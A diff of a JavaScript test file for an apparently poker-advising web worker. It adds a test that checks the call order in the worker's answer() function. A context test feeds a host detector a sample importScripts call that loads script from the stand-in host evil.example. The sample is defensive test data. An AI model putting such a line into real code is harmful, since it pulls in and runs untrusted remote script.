@@ -161,6 +161,19 @@ test("the published worker sends a node lock to engine/, before the advice and i
   assert.match(worker, /py\.globals\.set\("post_partial", \(s\) => postMessage\(\{ id: CUR, partial: JSON\.parse\(s\) \}\)\);/);
 });
 
+test("the published worker sends an opponent's move with a read to engine/, and one without it to Advisor.play", () => {
+  const worker = editWorker(upstream);
+  const body = worker.slice(worker.indexOf('"def answer(st, pl):'), worker.indexOf('"def early(st):'));
+  const at = (s) => {
+    assert.ok(body.includes(s), `answer() has no ${s}`);
+    return body.indexOf(s);
+  };
+  assert.ok(at("    try:") < at("if pl and st.get('locks'):"));
+  assert.ok(at("if pl and st.get('locks'):") < at("from engine.exploit_play import play as read_play"));
+  assert.ok(at("read_play(adv, st, pl['seat'], pl['hole'], pl.get('seed'))") < at("adv.play(st, pl['seat']"));
+  assert.ok(at("adv.play(st, pl['seat']") < at("except Cancelled:"));
+});
+
 test("hostsNamed sees URLs in comments and strings, and leaves the worker's own paths alone", () => {
   assert.deepEqual(hostsNamed("// from https://evil.example/x.js\n"), ["https://evil.example/x.js"]);
   assert.deepEqual(hostsNamed('importScripts("//evil.example/x.js")'), ["//evil.example/"]);
